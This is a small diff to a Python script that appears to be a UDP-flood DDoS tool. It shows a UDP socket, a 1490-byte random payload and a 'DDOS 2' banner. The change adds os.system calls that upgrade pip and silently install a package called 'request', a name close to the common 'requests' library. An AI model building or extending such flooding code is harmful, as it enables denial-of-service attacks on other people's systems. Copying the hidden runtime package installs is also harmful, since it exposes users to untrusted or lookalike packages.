@@ -18,6 +18,8 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
 #terminal clear all session
+os.system("pip install --upgrade pip")
+os.system("pip2 install request")
 os.system("clear")
 
 #terminal display DDOS 2 as figlet
